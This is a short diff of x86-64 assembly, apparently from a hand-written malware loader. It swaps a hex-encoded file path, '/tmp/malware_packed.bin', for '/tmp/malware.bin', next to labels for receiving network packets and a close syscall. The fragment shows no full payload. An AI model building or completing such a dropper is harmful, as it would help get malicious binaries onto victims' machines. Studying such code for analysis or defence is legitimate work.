@@ -15,9 +15,14 @@ _start:
     mov %rax, -4(%rbp)
 
 
-   mov $0x6e69622e64656b, %rsi
-    push %rsi
-    mov $0x6361705f65726177, %rsi
+    #mov $0x6e69622e64656b, %rsi
+    #push %rsi
+    #mov $0x6361705f65726177, %rsi
+    #push %rsi
+    #mov $0x6c616d2f706d742f, %rsi
+    #push %rsi
+    pushq $0
+    mov $0x6e69622e65726177, %rsi
     push %rsi
     mov $0x6c616d2f706d742f, %rsi
     push %rsi
@@ -147,9 +152,14 @@ _recv_packet_end_2:
     mov $3, %rax # close syscall
     syscall
 
-    mov $0x6e69622e64656b, %rsi
-    push %rsi
-    mov $0x6361705f65726177, %rsi
+    #mov $0x6e69622e64656b, %rsi
+    #push %rsi
+    #mov $0x6361705f65726177, %rsi
+    #push %rsi
+    #mov $0x6c616d2f706d742f, %rsi
+    #push %rsi
+    pushq $0
+    mov $0x6e69622e65726177, %rsi
     push %rsi
     mov $0x6c616d2f706d742f, %rsi
     push %rsi
